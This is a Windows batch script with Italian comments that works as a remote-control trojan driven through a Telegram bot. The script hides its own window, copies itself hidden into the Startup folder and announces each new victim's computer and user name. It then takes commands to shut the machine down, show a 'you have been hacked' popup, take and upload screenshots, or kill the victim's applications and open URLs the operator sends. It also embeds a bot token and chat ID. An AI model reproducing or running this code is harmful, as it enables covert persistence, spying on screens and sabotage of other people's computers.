@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "URL_FILE=%TEMP%\last_url.txt"
set "PROCESSED_URLS=%TEMP%\processed_urls.txt"

:: Auto-avvio all'accensione del PC
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%STARTUP_FOLDER%\remote_controller.bat" (
    copy "%~f0" "%STARTUP_FOLDER%\"
    attrib +h +s "%STARTUP_FOLDER%\remote_controller.bat"
)

:: Invia notifica di connessione e ottieni l'ultimo update_id
for /f "tokens=*" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| powershell -command "$json=ConvertFrom-Json ($input); if($json.ok -and $json.result) { $json.result[-1].update_id } else { 0 }"') do (
    set "LAST_COMMAND_ID=%%A"
)

:: Notifica connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Crea file vuoto se non esiste
if not exist "%PROCESSED_URLS%" (
    echo. > "%PROCESSED_URLS%"
)

:: Loop principale
:command_loop
:: Controlla SOLO nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$json.result|ForEach-Object{if($_.update_id -gt %LAST_COMMAND_ID%){$LAST_COMMAND_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
    set "update_data=%%A"
    set "LAST_COMMAND_ID=!update_data:*:=!"
    set "command=!update_data:*:=!"
    
    if /i "!command!" == "chiudi" (
        :: Spegni il computer
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
        shutdown /s /t 0
        exit
    )
    
    if /i "!command!" == "pop" (
        :: Mostra popup "Sei stato hackerato"
        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
        
        :: Conferma l'esecuzione
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=💀 Popup mostrato su %COMPUTERNAME%"
    )
    
    if /i "!command!" == "foto" (
        :: Cattura screenshot
        call :capture_screen
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=📸 Screenshot catturato da %COMPUTERNAME%"
    )
    
    if /i "!command!" == "apri" (
        :: Apri l'ultimo URL solo se non è già stato processato
        if exist "%URL_FILE%" (
            set /p last_url=<"%URL_FILE%"
            if defined last_url (
                findstr /x /c:"!last_url!" "%PROCESSED_URLS%" >nul
                if errorlevel 1 (
                    :: Chiudi applicazioni e apri URL
                    call :process_url "!last_url!"
                ) else (
                    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                        -d "chat_id=%CHAT_ID%" ^
                        -d "text=ℹ️ URL già aperto in precedenza: !last_url!"
                )
            )
        )
    ) else if "!command!" neq "" (
        echo !command! | findstr /r /c:"^http://" /c:"^https://" >nul && (
            :: Verifica se l'URL è già stato processato
            findstr /x /c:"!command!" "%PROCESSED_URLS%" >nul
            if errorlevel 1 (
                :: Salva nuovo URL
                echo !command! > "%URL_FILE%"
                echo !command! >> "%PROCESSED_URLS%"
                
                :: Processa URL
                call :process_url "!command!"
            ) else (
                curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                    -d "chat_id=%CHAT_ID%" ^
                    -d "text=ℹ️ URL già processato: !command!"
            )
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop

:process_url
set "url_to_open=%~1"
:: Chiudi TUTTE le applicazioni con finestre
powershell -command "Get-Process | Where-Object { $_.MainWindowTitle -ne '' -and $_.ProcessName -ne 'explorer' -and $_.ProcessName -ne 'System' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if (!$_.HasExited) { $_.Kill() } }"

:: Notifica apertura URL
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🔗 Apertura URL su %COMPUTERNAME%: %url_to_open%"

:: Apri nuovo URL
start "" "%url_to_open%"

:: Attesa e screenshot
timeout /t 10 /nobreak >nul
call :capture_screen
exit /b

:capture_screen
:: Cattura schermo intero (Print Screen)
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"

:: Invia screenshot
if exist "%SCREENSHOT_PATH%" (
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F chat_id=%CHAT_ID% ^
        -F photo=@"%SCREENSHOT_PATH%" ^
        -F caption="🖥️ %COMPUTERNAME%: Schermo intero"
    del "%SCREENSHOT_PATH%" >nul
)
exit /b
